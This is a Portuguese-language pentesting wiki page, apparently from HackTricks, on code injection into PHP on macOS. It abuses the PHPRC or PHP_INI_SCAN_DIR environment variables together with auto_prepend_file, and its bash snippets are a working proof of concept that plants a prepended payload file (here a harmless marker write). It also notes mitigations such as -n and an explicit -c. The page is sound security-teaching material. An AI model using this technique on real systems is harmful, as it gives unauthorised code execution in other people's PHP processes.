# Injeção em aplicações PHP no macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` e `auto_prepend_file`

PHP CLI e CGI leem a configuração a cada execução. `PHPRC` pode selecionar um `php.ini` que o atacante possa ler, enquanto `PHP_INI_SCAN_DIR` pode redirecionar o diretório verificado em busca de arquivos `.ini` adicionais. A diretiva `auto_prepend_file` faz com que o PHP analise um arquivo antes do script solicitado; assim, essa combinação resulta em execução de código na inicialização.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Uma alternativa é um diretório contendo um arquivo `.ini`:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
A opção `-n` ignora o `php.ini`; um caminho `-c` confiável e explícito tem precedência sobre `PHPRC`. Lembre-se de que um server SAPI de longa duração normalmente lê a configuração quando o servidor web é iniciado, enquanto CLI e CGI fazem isso a cada invocação.<sup>[[1]](#references)</sup>

## References

- [1] [Arquivo de configuração do PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [`auto_prepend_file` do PHP](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
